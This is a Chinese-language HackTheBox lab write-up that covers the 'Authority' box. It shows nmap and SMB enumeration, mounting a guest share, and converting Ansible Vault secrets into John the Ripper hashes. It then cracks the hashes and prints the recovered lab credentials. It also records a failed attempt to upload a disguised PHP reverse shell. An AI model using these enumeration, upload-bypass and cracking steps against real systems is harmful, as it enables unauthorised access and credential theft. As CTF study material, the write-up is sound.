<p>访问10.10.11.229&#x2F;uploads&#x2F;afa550e9c06e4211714e3b1c870b7168&#x2F;mm.php .pdf</p>
<p>删除后面的 .pdf，也监听不到啊</p>
<p>没用，哼</p>
<p>我再试最后一次，去网上找一个 <code>php_reverse_shell</code>代码，重复操作</p>
<p>不行</p>
<p>哼，告辞</p>
<h3 id="root-5"><a href="#root-5" class="headerlink" title="root"></a>root</h3><h2 id="Authority"><a href="#Authority" class="headerlink" title="Authority"></a>Authority</h2><h3 id="user-6"><a href="#user-6" class="headerlink" title="user"></a>user</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">信息收集</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nmap端口</span></span><br><span class="line">└─# nmap -sT --min-rate 10000 -p- 10.10.11.222                   </span><br><span class="line">Nmap scan report for 10.10.11.222</span><br><span class="line">Host is up (0.36s latency).</span><br><span class="line">Not shown: 50150 filtered tcp ports (no-response), 15372 closed tcp ports (conn-refused)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">80/tcp    open  http</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49688/tcp open  unknown</span><br><span class="line">49689/tcp open  unknown</span><br><span class="line">49715/tcp open  unknown</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">处理下，合并一行</span></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# awk &#x27;&#123;print $1&#125;&#x27; test.txt | grep &quot;/tcp$&quot; </span><br><span class="line">53/tcp</span><br><span class="line">80/tcp</span><br><span class="line">135/tcp</span><br><span class="line">139/tcp</span><br><span class="line">445/tcp</span><br><span class="line">464/tcp</span><br><span class="line">636/tcp</span><br><span class="line">9389/tcp</span><br><span class="line">49665/tcp</span><br><span class="line">49666/tcp</span><br><span class="line">49688/tcp</span><br><span class="line">49689/tcp</span><br><span class="line">49715/tcp</span><br><span class="line">         </span><br><span class="line">awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; test.txt               </span><br><span class="line">53</span><br><span class="line">80</span><br><span class="line">135</span><br><span class="line">139</span><br><span class="line">445</span><br><span class="line">464</span><br><span class="line">636</span><br><span class="line">9389</span><br><span class="line">49665</span><br><span class="line">49666</span><br><span class="line">49688</span><br><span class="line">49689</span><br><span class="line">49715                                                                                            </span><br><span class="line">awk -F &#x27;/&#x27; &#x27;&#123;print $1&#125;&#x27; test.txt | paste -sd &#x27;,&#x27;</span><br><span class="line">53,80,135,139,445,464,636,9389,49665,49666,49688,49689,49715,</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">nmap细节</span></span><br><span class="line">nmap -sT -sV -sC -O -p53,80,135,139,445,464,636,9389,49665,49666,49688,49689,49715 10.10.11.222</span><br><span class="line"></span><br><span class="line">PORT      STATE SERVICE       VERSION</span><br><span class="line">53/tcp    open  domain        Simple DNS Plus</span><br><span class="line">80/tcp    open  http          Microsoft IIS httpd 10.0</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: IIS Windows Server</span><br><span class="line">135/tcp   open  msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds?</span><br><span class="line">464/tcp   open  kpasswd5?</span><br><span class="line">636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: authority.htb, Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2023-10-06T07:09:40+00:00; +3h59m50s from scanner time.</span><br><span class="line">| ssl-cert: Subject: </span><br><span class="line">| Subject Alternative Name: othername: UPN::AUTHORITY$@htb.corp, DNS:authority.htb.corp, DNS:htb.corp, DNS:HTB</span><br><span class="line">| Not valid before: 2022-08-09T23:03:21</span><br><span class="line">|_Not valid after:  2024-08-09T23:13:21</span><br><span class="line">9389/tcp  open  mc-nmf        .NET Message Framing</span><br><span class="line">49665/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49688/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">49689/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">49715/tcp open  msrpc         Microsoft Windows RPC</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (93%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Longhorn (92%), Microsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 1909 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 14393 (91%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (91%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: ...</span><br><span class="line">|_  start_date: N/A</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   311: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">|_clock-skew: mean: 3h59m49s, deviation: 0s, median: 3h59m49s</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>有80端口，rpc远程服务，还有域即DNS服务，smb服务，LDAP服务、windows系统</p>
<p>(Domain: authority.htb, Site: Default-First-Site-Name)</p>
</blockquote>
<p>访问下10.10.11.222，是个IIS的欢迎页面，还是要爆破路径</p>
<p>用了dirbuster，它自带一个字典(usr&#x2F;share&#x2F;wordlists&#x2F;..)，fuzz一下，线程最好10-20之间，否则算是dos攻击了</p>
<h4 id="DNS枚举"><a href="#DNS枚举" class="headerlink" title="DNS枚举"></a>DNS枚举</h4><p>53端口</p>
<p>nslookup</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">nslookup</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">server 10.10.11.222</span></span><br><span class="line">Default server: 10.10.11.222</span><br><span class="line">Address: 10.10.11.222#53</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">localhost</span></span><br><span class="line">;; communications error to 10.10.11.222#53: timed out</span><br><span class="line">Server:         10.10.11.222</span><br><span class="line">Address:        10.10.11.222#53</span><br><span class="line"></span><br><span class="line">Non-authoritative answer:</span><br><span class="line">Name:   localhost</span><br><span class="line">Address: 127.0.0.1</span><br><span class="line">** server can&#x27;t find localhost: SERVFAIL</span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">10.10.11.222</span></span><br><span class="line">;; communications error to 10.10.11.222#53: timed out</span><br><span class="line">;; communications error to 10.10.11.222#53: timed out</span><br><span class="line">;; communications error to 10.10.11.222#53: timed out</span><br><span class="line">;; no servers could be reached</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">DNS Zone Transfer</span></span><br><span class="line">dig axfr @10.10.11.222    </span><br><span class="line">;; communications error to 10.10.11.222#53: timed out</span><br><span class="line"></span><br><span class="line">; &lt;&lt;&gt;&gt; DiG 9.18.8-1-Debian &lt;&lt;&gt;&gt; axfr @10.10.11.222</span><br><span class="line">; (1 server found)</span><br><span class="line">;; global options: +cmd</span><br><span class="line">;; Query time: 4676 msec</span><br><span class="line">;; SERVER: 10.10.11.222#53(10.10.11.222) (UDP)</span><br><span class="line">;; WHEN: Fri Oct 06 11:52:52 CST 2023</span><br><span class="line">;; MSG SIZE  rcvd: 28</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>DNSenum</p>
<h4 id="SMB枚举"><a href="#SMB枚举" class="headerlink" title="SMB枚举"></a>SMB枚举</h4><p>445端口</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -u &quot;&quot; -p &quot;&quot; -P 445 -H 10.10.11.222 &amp;&amp; smbmap -u &quot;guest&quot; -p &quot;&quot; -P 445 -H 10.10.11.222</span><br></pre></td></tr></table></figure>

<p><img src="/../../../Typora/img111/image-20231006115948089.png"></p>
<p>结果显示出guest对Development文件夹有只读权限</p>
<p>所以可以将这个挂载到kali机器上</p>
<p>(也可以用<code>smbclient -N //10.10.11.222/Development</code>，直接进去了)</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t cifs -o username=cifs_share_user //10.10.11.222/Development /home/kali/htbmount/</span><br></pre></td></tr></table></figure>

<p>需要密码，直接回车</p>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_4296776/5369786">树结构</a>查看</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/htbmount]</span><br><span class="line">└─# tree Au*     </span><br><span class="line">Automation</span><br><span class="line">└── Ansible</span><br><span class="line">    ├── ADCS</span><br><span class="line">    │   ├── defaults</span><br><span class="line">    │   │   └── main.yml</span><br><span class="line">    │   ├── LICENSE</span><br><span class="line">    │   ├── meta</span><br><span class="line">    │   │   ├── main.yml</span><br><span class="line">    │   │   └── preferences.yml</span><br><span class="line">    │   ├── molecule</span><br><span class="line">    │   │   └── default</span><br><span class="line">    │   │       ├── converge.yml</span><br><span class="line">    │   │       ├── molecule.yml</span><br><span class="line">    │   │       └── prepare.yml</span><br><span class="line">    │   ├── README.md</span><br><span class="line">    │   ├── requirements.txt</span><br><span class="line">    │   ├── requirements.yml</span><br><span class="line">    │   ├── SECURITY.md</span><br><span class="line">    │   ├── tasks</span><br><span class="line">    │   │   ├── assert.yml</span><br><span class="line">    │   │   ├── generate_ca_certs.yml</span><br><span class="line">    │   │   ├── init_ca.yml</span><br><span class="line">    │   │   ├── main.yml</span><br><span class="line">    │   │   └── requests.yml</span><br><span class="line">    │   ├── templates</span><br><span class="line">    │   │   ├── extensions.cnf.j2</span><br><span class="line">    │   │   └── openssl.cnf.j2</span><br><span class="line">    │   ├── tox.ini</span><br><span class="line">    │   └── vars</span><br><span class="line">    │       └── main.yml</span><br><span class="line">    ├── LDAP</span><br><span class="line">    │   ├── defaults</span><br><span class="line">    │   │   └── main.yml</span><br><span class="line">    │   ├── files</span><br><span class="line">    │   │   └── pam_mkhomedir</span><br><span class="line">    │   ├── handlers</span><br><span class="line">    │   │   └── main.yml</span><br><span class="line">    │   ├── meta</span><br><span class="line">    │   │   └── main.yml</span><br><span class="line">    │   ├── README.md</span><br><span class="line">    │   ├── tasks</span><br><span class="line">    │   │   └── main.yml</span><br><span class="line">    │   ├── templates</span><br><span class="line">    │   │   ├── ldap_sudo_groups.j2</span><br><span class="line">    │   │   ├── ldap_sudo_users.j2</span><br><span class="line">    │   │   ├── sssd.conf.j2</span><br><span class="line">    │   │   └── sudo_group.j2</span><br><span class="line">    │   ├── TODO.md</span><br><span class="line">    │   ├── Vagrantfile</span><br><span class="line">    │   └── vars</span><br><span class="line">    │       ├── debian.yml</span><br><span class="line">    │       ├── main.yml</span><br><span class="line">    │       ├── redhat.yml</span><br><span class="line">    │       └── ubuntu-14.04.yml</span><br><span class="line">    ├── PWM</span><br><span class="line">    │   ├── ansible.cfg</span><br><span class="line">    │   ├── ansible_inventory</span><br><span class="line">    │   ├── defaults</span><br><span class="line">    │   │   └── main.yml</span><br><span class="line">    │   ├── handlers</span><br><span class="line">    │   │   └── main.yml</span><br><span class="line">    │   ├── meta</span><br><span class="line">    │   │   └── main.yml</span><br><span class="line">    │   ├── README.md</span><br><span class="line">    │   ├── tasks</span><br><span class="line">    │   │   └── main.yml                                                                        </span><br><span class="line">    │   └── templates                                                                           </span><br><span class="line">    │       ├── context.xml.j2                                                                  </span><br><span class="line">    │       └── tomcat-users.xml.j2                                                             </span><br><span class="line">    └── SHARE                                                                                   </span><br><span class="line">        └── tasks</span><br><span class="line">            └── main.yml</span><br><span class="line"></span><br><span class="line">25 directories, 46 files</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.ansible.com/overview/how-ansible-works#:~:text=Ansible%C2%AE%20is%20an%20open,%2C%20system%20updates%2C%20and%20more.">什么是Ansible</a>?</p>
<p><a target="_blank" rel="noopener" href="https://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible">https://ppn.snovvcrash.rocks/pentest/infrastructure/devops/ansible</a></p>
<p><a target="_blank" rel="noopener" href="https://docs.ansible.com/automation-controller/4.3/html_zh/administration/tipsandtricks.html">中文版本</a></p>
</blockquote>
<p>所以这里是有credentials的</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat Automation/Ansible/PWM/defaults/main.yml   </span><br></pre></td></tr></table></figure>

<p><img src="/../../../Typora/img111/image-20231006122852679.png"></p>
<p><img src="/../../../Typora/img111/image-20231006122918228.png"></p>
<p>有个脚本</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># This software is Copyright (c) 2018, Dhiru Kholia &lt;kholia at kth.se&gt; and it</span></span><br><span class="line"><span class="comment"># is hereby released to the general public under the following terms:</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Redistribution and use in source and binary forms, with or without</span></span><br><span class="line"><span class="comment"># modification, are permitted.</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Tested with ansible-vault 2.4.3.0 running on Fedora 27.</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"></span><br><span class="line">PY3 = sys.version_info[<span class="number">0</span>] == <span class="number">3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> PY3:</span><br><span class="line">    reload(sys)</span><br><span class="line">    sys.setdefaultencoding(<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">HEADER = <span class="string">b&#x27;$ANSIBLE_VAULT&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Parser for Ansible Vault .yml files</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    bfilename = os.path.basename(filename)</span><br><span class="line"></span><br><span class="line">    data = <span class="built_in">open</span>(filename, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> data.startswith(HEADER):</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    tmpdata = data.splitlines()</span><br><span class="line">    tmpheader = tmpdata[<span class="number">0</span>].strip().split(<span class="string">b&#x27;;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    _ = tmpheader[<span class="number">1</span>].strip()  <span class="comment"># version</span></span><br><span class="line">    cipher_name = tmpheader[<span class="number">2</span>].strip()</span><br><span class="line">    ciphertext = <span class="string">b&#x27;&#x27;</span>.join(tmpdata[<span class="number">1</span>:])</span><br><span class="line">    salt, checksum, ct = unhexlify(ciphertext).split(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> PY3:</span><br><span class="line">        salt = salt.decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        checksum = checksum.decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        ct = ct .decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">        cipher_name = cipher_name .decode(<span class="string">&quot;ascii&quot;</span>)</span><br><span class="line">    version = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> cipher_name != <span class="string">&quot;AES256&quot;</span>:</span><br><span class="line">        sys.stderr.write(<span class="string">&quot;%s: unsupported ciper &#x27;%s&#x27; found!\n&quot;</span> % (bfilename, cipher_name))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    cipher = <span class="number">0</span></span><br><span class="line">    sys.stdout.write(<span class="string">&quot;%s:$ansible$%d*%d*%s*%s*%s\n&quot;</span> %</span><br><span class="line">                     (os.path.basename(filename), version, cipher, salt, ct, checksum))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        sys.stderr.write(<span class="string">&quot;Usage: %s [Ansible Vault .yml file(s)]\n&quot;</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(sys.argv)):</span><br><span class="line">        process_file(sys.argv[i])</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这个py是可以从加密文件生成与“John the Ripper”兼容的哈希值，然后，使用john尝试破解加密并检索原始凭据</p>
<p>具体做法：</p>
<p>先提取出第一个的内容，复制为vault1.yml</p>
<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$ANSIBLE_VAULT;1.1;AES256</span></span><br><span class="line"><span class="string">326665343864353665376531366637316331386162643232303835663339663466623131613262396134353663663462373265633832356663356239383039640a346431373431666433343434366139356536343763336662346134663965343430306561653964643235643733346162626134393430336334326263326364380a6530343137333266393234336261303438346635383264396362323065313438</span></span><br></pre></td></tr></table></figure>

<p>然后用脚本处理，得到了一堆哈希值</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">python3 ansible* vault1.yml</span><br><span class="line"></span><br><span class="line">vault1.yml:$ansible$0*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">将上面冒号后的哈希值，存到一个hash1.txt里</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">然后用john，rackyou.txt是自定义的爆破字典</span></span><br><span class="line"></span><br><span class="line">john --wordlist=/usr/share/john/rackyou.txt hash1.txt</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">我的字典缘故，没解出来</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">我找了个135M的大字典，哈哈哈哈！！！！！</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示结果</span></span><br></pre></td></tr></table></figure>

<p><img src="/../../../Typora/img111/image-20231006144718020.png" alt="!@#$%^&amp;*"></p>
<p>这个破解出来的是后面工具需要的vault密码</p>
<p>使用ansible-vault解密</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install ansible-vault -i https://pypi.douban.com/simple --trusted-host=pypi.douban.com</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">镜像地址快一点</span></span><br></pre></td></tr></table></figure>



<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">用ansible-vault破解</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这个是pwm_admin_login</span></span><br><span class="line">cat vault1.yml | ansible-vault decrypt                                                    </span><br><span class="line">Vault password:  #输入密码</span><br><span class="line">Decryption successful</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示了内容</span></span><br><span class="line">svc_pwm  </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">这个是pwm_admin_password</span></span><br><span class="line">cat vault2.yml | ansible-vault decrypt</span><br><span class="line">Vault password: </span><br><span class="line">Decryption successful</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">显示了密码</span></span><br><span class="line">pWm_@dm!N_!23    </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">vault3的时候错误了</span></span><br><span class="line"></span><br><span class="line">There was a vault format error in -: Vault format unhexlify error: Non-hexadecimal digit found</span><br><span class="line">ERROR! Vault format unhexlify error: Non-hexadecimal digit found for -</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">嘶，1,2都是这样过来的啊，怎么到你，偏偏出错呢？你不对劲</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">好吧，是末尾多了几个空格，删干净</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">ldap_admin_password</span></span><br><span class="line">cat vault3.yml | ansible-vault decrypt</span><br><span class="line">Vault password: </span><br><span class="line">Decryption successful</span><br><span class="line">DevT3st@123 </span><br></pre></td></tr></table></figure>

<p>好好好，三个都拿到了</p>
<h4 id="Web枚举"><a href="#Web枚举" class="headerlink" title="Web枚举"></a>Web枚举</h4><p>大佬是扫到了8443端口，有一个<code>/pwd</code>目录</p>
<p><img src="/../../../Typora/img111/image-20231006202025020.png"></p>
<p>尝试用上面破解到的用户名和密码，弹出</p>
<p><img src="/../../../Typora/img111/image-20231006202250005.png"></p>
